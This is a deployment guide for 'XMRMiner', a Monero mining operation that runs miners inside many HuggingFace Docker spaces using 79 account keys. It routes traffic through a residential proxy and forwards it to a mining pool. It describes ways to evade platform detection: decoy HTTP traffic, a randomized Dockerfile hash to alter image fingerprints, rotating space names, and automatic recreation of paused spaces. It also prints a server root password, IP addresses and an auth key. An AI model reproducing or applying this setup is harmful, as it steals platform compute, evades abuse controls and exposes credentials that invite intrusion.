# Deployment

## Overview

XMRMiner is deployed across multiple HuggingFace Docker spaces with ScrapeOps residential proxy for IP rotation.

## Components

### 1. xmrproxy (Server)
- Alibaba Cloud: `8.219.164.50`
- Listens on `0.0.0.0:41928` (WSS)
- Forwards stratum to pool at `213.192.2.99:3333`
- Auth key: `91253e8170324a949121d274fe4bff64`

### 2. xmrminer (Client)
- Runs in HF Docker spaces
- Connects to proxy via WSS
- 2 threads per space
- Decoy HTTP traffic to major sites

### 3. ScrapeOps Proxy
- Residential proxy service
- Country geotargeting: `us`
- Sticky sessions per HF account
- Format: `http://scrapeops.country=us.sticky_session=N:API_KEY@residential-proxy.scrapeops.io:8181`

## Server Setup

### Prerequisites
```bash
ssh root@8.219.164.50
# Password: Tian0810

# Install build tools
dnf install -y gcc gcc-c++ make cmake openssh-clients rsync
```

### Deploy Code
```bash
# From local machine
scp -r /home/gamerwaka/xmrminer root@8.219.164.50:/root/
scp -r /home/gamerwaka/xmrproxy root@8.219.164.50:/root/

# On server
cd /root/xmrproxy && make clean && make
cd /root/xmrminer && make clean && make
```

### Run Services
```bash
# Start proxy (background)
cd /root/xmrproxy && ./xmrproxy &

# Start miner (background)
cd /root/xmrminer && ./xmrminer --run &
```

## HF Space Deployment

### Script
`init.sh` — Automated deployment across HF accounts.

### How it works

1. **Read keys** from `hf_pre.txt` (79 active keys)
2. **Check existing spaces** per account
3. **Create spaces** if < 3 running
4. **Upload files** via HF API
5. **Wait for startup** (BUILDING → APP_STARTING → RUNNING)
6. **Auto-retry** if stuck (delete + recreate with new name)

### Key Features

- **Proxy injection**: Each account gets unique sticky session
- **Random names**: `ADJ + NOUN` (400+ combinations)
- **Duplicate-based**: Upload first space, duplicate 2nd/3rd
- **Random Dockerfile hash**: Changes image fingerprint per upload
- **Auto-retry**: BUILDING >2min or APP_STARTING >1.5min → recreate
- **Name rotation**: Stuck spaces get new random names on recreate
- **Exist check**: Only creates if < 3 good (RUNNING/APP_STARTING) spaces

### Usage

```bash
# Run from key 1
bash init.sh

# Run specific range
START=10 END=20 bash init.sh

# Fix mode (check existing)
FIX_MODE=true bash init.sh
```

### HF Space States

| State | Meaning | Action |
|-------|---------|--------|
| RUNNING | Working | Skip |
| APP_STARTING | Starting | Wait |
| BUILDING | Building | Wait (max 2min) |
| PAUSED | Paused | Delete + recreate |
| NO_APP_FILE | Missing files | Upload files |
| (empty) | Not found | Create new |

## Rate Limits

- HF: 20 space creations per day per account
- HF: 1 concurrent build per account
- HF: Max 3 spaces per account (extras get PAUSED)
- ScrapeOps: No known limit

## Monitoring

### Check space status
```bash
# List spaces for account
curl -s -H "Authorization: Bearer $KEY" \
  "https://huggingface.co/api/spaces?author=$USERNAME" | jq '.[].id'

# Check specific space
curl -s -H "Authorization: Bearer $KEY" \
  "https://huggingface.co/api/spaces/$USERNAME/$SPACE" | jq '.runtime.stage'
```

### Check mining activity
```bash
# View run logs
curl -s -H "Authorization: Bearer $KEY" \
  "https://huggingface.co/api/spaces/$USERNAME/$SPACE/logs/run"
```

## Troubleshooting

### Space stuck in BUILDING
- Wait 2 minutes (auto-retry triggers)
- Or delete manually and recreate

### Space shows PAUSED
- Account has >3 spaces
- Delete extras

### No mining in logs
- Check proxy is running on server
- Check WSS connection in logs
- Verify auth key matches

### Space not starting
- Check Dockerfile exists
- Check start.sh has proxy config
- Check HF build logs
